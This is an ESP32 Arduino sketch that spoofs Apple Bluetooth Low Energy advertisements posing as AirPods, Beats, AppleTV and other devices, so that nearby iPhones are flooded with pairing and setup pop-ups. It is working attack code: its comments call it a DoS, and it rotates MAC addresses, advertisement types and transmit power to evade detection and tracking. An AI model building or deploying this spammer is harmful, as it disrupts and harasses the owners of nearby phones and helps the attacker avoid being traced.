// This example takes heavy inspiration from the ESP32 example by ronaldstoner
// Based on the previous work of chipik / _hexway / ECTO-1A & SAY-10
// See the README for more info

// ============= LED.HPP =============
enum LEDMode { OFF = 0, FLASH = 1, ON = 2 };

LEDMode stateTable[9][2] = {
  {OFF,   OFF},   // 0
  {OFF,   FLASH}, // 1
  {OFF,   ON},    // 2
  {FLASH, OFF},   // 3
  {FLASH, FLASH}, // 4
  {FLASH, ON},    // 5
  {ON,    OFF},   // 6
  {ON,    FLASH}, // 7 
  {ON,    ON}     // 8
};

enum LEDState {
  LEFT_OFF_RIGHT_OFF = 0,
  LEFT_OFF_RIGHT_FLASH = 1,
  LEFT_OFF_RIGHT_ON = 2,
  LEFT_FLASH_RIGHT_OFF = 3,
  LEFT_FLASH_RIGHT_FLASH = 4,
  LEFT_FLASH_RIGHT_ON = 5,
  LEFT_ON_RIGHT_OFF = 6,
  LEFT_ON_RIGHT_FLASH = 7,
  LEFT_ON_RIGHT_ON = 8
};

// ============= DEVICES.HPP =============
enum PacketType { APPLE_AUDIO, APPLE_SETUP };

struct AppleDevice {
  const char* name;
  uint8_t modelId;
  PacketType type;
};

enum DeviceIndex : uint8_t {
  // Audio (31 bytes, ID at index 7)
  AIRPODS = 0,
  POWER_BEATS,
  BEATS_X,
  BEATS_SOLO_3,
  BEATS_STUDIO_3,
  AIRPODS_MAX,
  POWER_BEATS_PRO,
  BEATS_SOLO_PRO,
  AIRPODS_PRO,
  AIRPODS_GEN_2,
  BEATS_FLEX,
  BEATS_STUDIO_BUDS,
  BEATS_FIT_PRO,
  AIRPODS_GEN_3,
  AIRPODS_PRO_GEN_2,
  BEATS_STUDIO_BUDS_PLUS,
  BEATS_STUDIO_PRO,
  AIRPODS_PRO_GEN_2_USB_C,
  BEATS_SOLO_4,
  BEATS_SOLO_BUDS,
  SOFTWARE_UPDATE,
  POWERBEATS_FIT,
  // Setup (23 bytes, ID at index 13)
  APPLETV_SETUP,
  TRANSFER_NUMBER,
  APPLETV_PAIR,
  SETUP_NEW_PHONE,
  HOMEPOD_SETUP,
  APPLETV_HOMEKIT_SETUP,
  APPLETV_KEYBOARD_SETUP,
  TV_COLOR_BALANCE,
  APPLETV_NEW_USER,
  VISION_PRO,
  APPLETV_CONNECTING_TO_NETWORK,
  APPLETV_APPLEID_SETUP,
  APPLETV_WIRELESS_AUDIO_SYNC,
  NUM_DEVICES
};

const AppleDevice ALL_DEVICES[] = {
  // Audio Devices (31 bytes, ID at index 7)
  // These are audio devices: wireless headphones / earbuds
  // It seems these need a shorter range between ESP & iDevice
  {"Airpods", 0x02, APPLE_AUDIO},
  {"Power Beats", 0x03, APPLE_AUDIO},
  {"Beats X", 0x05, APPLE_AUDIO},
  {"Beats Solo 3", 0x06, APPLE_AUDIO},
  {"Beats Studio 3", 0x09, APPLE_AUDIO},
  {"Airpods Max", 0x0a, APPLE_AUDIO},
  {"Power Beats Pro", 0x0b, APPLE_AUDIO},
  {"Beats Solo Pro", 0x0c, APPLE_AUDIO},
  {"Airpods Pro", 0x0e, APPLE_AUDIO},
  {"Airpods Gen 2", 0x0f, APPLE_AUDIO},
  {"Beats Flex", 0x10, APPLE_AUDIO},
  {"Beats Studio Buds", 0x11, APPLE_AUDIO},
  {"Beats Fit Pro", 0x12, APPLE_AUDIO},
  {"Airpods Gen 3", 0x13, APPLE_AUDIO},
  {"Airpods Pro Gen 2", 0x14, APPLE_AUDIO},
  {"Beats Studio Buds Plus", 0x16, APPLE_AUDIO},
  {"Beats Studio Pro", 0x17, APPLE_AUDIO},
  {"Airpods Pro Gen 2 USB-C", 0x24, APPLE_AUDIO},
  {"Beats Solo 4", 0x25, APPLE_AUDIO},
  {"Beats Solo Buds", 0x26, APPLE_AUDIO},
  {"Software update", 0x2e, APPLE_AUDIO},
  {"Powerbeats fit", 0x2f, APPLE_AUDIO},

  // Setup Devices (23 bytes, ID at index 13)
  // These are more general home devices
  // It seems these can work over long distances, especially AppleTV Setup
  {"AppleTV Setup", 0x01, APPLE_SETUP},
  {"Transfer Number", 0x02, APPLE_SETUP},
  {"AppleTV Pair", 0x06, APPLE_SETUP},
  {"Setup New Phone", 0x09, APPLE_SETUP},
  {"Homepod Setup", 0x0b, APPLE_SETUP},
  {"AppleTV Homekit Setup", 0x0d, APPLE_SETUP},
  {"AppleTV Keyboard Setup", 0x13, APPLE_SETUP},
  {"TV Color Balance", 0x1e, APPLE_SETUP},
  {"AppleTV New User", 0x20, APPLE_SETUP},
  {"Vision Pro", 0x24, APPLE_SETUP},
  {"AppleTV Connecting to Network", 0x27, APPLE_SETUP},
  {"AppleTV AppleID Setup", 0x2b, APPLE_SETUP},
  {"AppleTV Wireless Audio Sync", 0xc0, APPLE_SETUP},
};

// ============= DEVICES.CPP (generatePacket function) =============
void generatePacket(const AppleDevice& device, uint8_t* buffer, size_t& outLength) {
  memset(buffer, 0, 31); // Clear buffer

  if (device.type == APPLE_AUDIO) {
      outLength = 31;
      uint8_t header[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07};
      uint8_t body[]   = {0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
      
      memcpy(buffer, header, 7);
      buffer[7] = device.modelId;
      memcpy(buffer + 8, body, 11);
  } 
  else if (device.type == APPLE_SETUP) {
      outLength = 23;
      // The common 23-byte setup prefix
      uint8_t prefix[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1};
      // The common 23-byte setup suffix (starting after index 13)
      uint8_t suffix[] = {0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
      
      memcpy(buffer, prefix, 13);
      buffer[13] = device.modelId; // In "Short" packets, the ID is at index 13
      memcpy(buffer + 14, suffix, 9);
  }
}

// ============= MAIN SKETCH =============
#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <Preferences.h>
#include <esp_arduino_version.h>

// Bluetooth maximum transmit power
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
#endif

BLEAdvertising *pAdvertising;  // global variable
uint32_t delayMilliseconds = 100;

int currentMode = 0;
Preferences preferences;

#define RIGHT_LED 12
#define LEFT_LED 13
const int BOOT_BUTTON_PIN = 9;
const unsigned long LONG_PRESS_TIME = 1000; // 1 seconds

void setup() {
  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE");

  // Open "storage" namespace (false = read/write)
  preferences.begin("my-app", false);

  // Get the current mode, default to 0 if it doesn't exist
  currentMode = preferences.getInt("mode", 0);
  Serial.printf("Current Mode: %d\n", currentMode);
  preferences.end();

  // This is specific to the AirM2M ESP32 board
  // https://wiki.luatos.com/chips/esp32c3/board.html
  pinMode(RIGHT_LED, OUTPUT);
  pinMode(LEFT_LED, OUTPUT);
  pinMode(BOOT_BUTTON_PIN, INPUT_PULLUP);
  
  BLEDevice::init("AirPods 69");

  // Increase the BLE Power to 21dBm (MAX)
  // https://docs.espressif.com/projects/esp-idf/en/stable/esp32c3/api-reference/bluetooth/controller_vhci.html
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  // seems we need to init it with an address in setup() step.
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void resetMode(){
  currentMode = 0;
  Serial.printf("Resetting mode to %d\n", currentMode);
  preferences.begin("my-app", false);
  preferences.putInt("mode", currentMode);
  preferences.end();
}

void nextMode(){
  currentMode = (currentMode + 1) % (sizeof(stateTable) / sizeof(stateTable[0]));
  Serial.printf("Updating mode to %d\n", currentMode);
  preferences.begin("my-app", false);
  preferences.putInt("mode", currentMode);
  preferences.end();
}

void setAdvertisementData(BLEAdvertisementData &oAdvertisementData, const AppleDevice& dev) {
  uint8_t packet[31];
  size_t packetLen;
  generatePacket(dev, packet, packetLen);
  Serial.printf("Broadcasting %s (Length: %d)...\n", dev.name, packetLen);

  #ifdef ESP_ARDUINO_VERSION_MAJOR
    #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
        oAdvertisementData.addData(String((char*)packet, packetLen));
    #else
        oAdvertisementData.addData(std::string((char*)packet, packetLen));
    #endif
  #endif
}

void setRandomDeviceData(BLEAdvertisementData &oAdvertisementData) {
  // Randomly pick data from one of the devices
  int idx = random(0, sizeof(ALL_DEVICES) / sizeof(ALL_DEVICES[0]));
  AppleDevice dev = ALL_DEVICES[idx];
  setAdvertisementData(oAdvertisementData, dev);
}

bool shouldBeLitOn(LEDMode mode) {
  switch (mode) {
    case ON:    return true;
    case OFF:   return false;
    case FLASH: return true;
    default:    return false;
  }
}

bool shouldBeLitOff(LEDMode mode) {
  switch (mode) {
    case ON:    return false;
    case OFF:   return true;
    case FLASH: return true;
    default:    return false;
  }
}

void loop() {
  digitalWrite(LEFT_LED,  shouldBeLitOn(stateTable[currentMode][0])  ? HIGH : LOW);
  digitalWrite(RIGHT_LED, shouldBeLitOn(stateTable[currentMode][1]) ? HIGH : LOW);

  if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
    unsigned long startTime = millis();
    while(digitalRead(BOOT_BUTTON_PIN) == LOW); 

    unsigned long pressDuration = millis() - startTime;
    if (pressDuration > LONG_PRESS_TIME) {
      Serial.println("BOOT button long pressed!");
      resetMode();
    } else {
      Serial.println("BOOT button short pressed!");
      nextMode();
    }
  }

  // First generate fake random MAC
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);

    // It seems for some reason first 4 bits
    // Need to be high (aka 0b1111), so we 
    // OR with 0xF0
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  switch (currentMode){
    case LEFT_OFF_RIGHT_OFF:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS]); // This one seems the most spammy
      break;
    case LEFT_OFF_RIGHT_FLASH:
    setRandomDeviceData(oAdvertisementData);
      break;
    case LEFT_OFF_RIGHT_ON:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[SOFTWARE_UPDATE]); // This is fairly spammy, not all phones
      break;
    case LEFT_FLASH_RIGHT_OFF:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS_GEN_2]); // TBD
      break;
    case LEFT_FLASH_RIGHT_FLASH:
    setAdvertisementData(oAdvertisementData, ALL_DEVICES[VISION_PRO]); // THis one affects very few devices, not as spammy (but kinda fun)
      break;
    case LEFT_FLASH_RIGHT_ON:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS_MAX]); // TBD
      break;
    case LEFT_ON_RIGHT_OFF:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[APPLETV_SETUP]); // TBD
      break;
    case LEFT_ON_RIGHT_FLASH:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[TRANSFER_NUMBER]); // TBD
      break;
    case LEFT_ON_RIGHT_ON:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[APPLETV_PAIR]); // TBD
      break;
    default:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[HOMEPOD_SETUP]); // TBD
      break;
  }

  /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
      the three advertising PDU types when you want to connect to Apple devices.
          // 0 = ADV_TYPE_IND, 
          // 1 = ADV_TYPE_SCAN_IND
          // 2 = ADV_TYPE_NONCONN_IND
      
      Randomly using any of these PDU types may increase detectability of spoofed packets. 

      What we know for sure:
      - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
                        Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
  */
  
  int adv_type_choice = random(3);
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  // Set the device address, advertisement data
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);
  
  // Set advertising interval
  /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
      an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
      
      These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
  */

  //pAdvertising->setMinInterval(0x20);
  //pAdvertising->setMaxInterval(0x20);
  //pAdvertising->setMinPreferred(0x20);
  //pAdvertising->setMaxPreferred(0x20);

  // Start advertising
  pAdvertising->start();

  digitalWrite(LEFT_LED,  shouldBeLitOff(stateTable[currentMode][0]) ? LOW : HIGH);
  digitalWrite(RIGHT_LED, shouldBeLitOff(stateTable[currentMode][1]) ? LOW : HIGH);
  delay(delayMilliseconds); // delay for delayMilliseconds ms
  pAdvertising->stop();

  // Random signal strength increases the difficulty of tracking the signal
  int rand_val = random(100);  // Generate a random number between 0 and 99
  if (rand_val < 70) {  // 70% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  } else if (rand_val < 85) {  // 15% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
  } else if (rand_val < 95) {  // 10% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
  } else if (rand_val < 99) {  // 4% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
  } else {  // 1% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
  }
}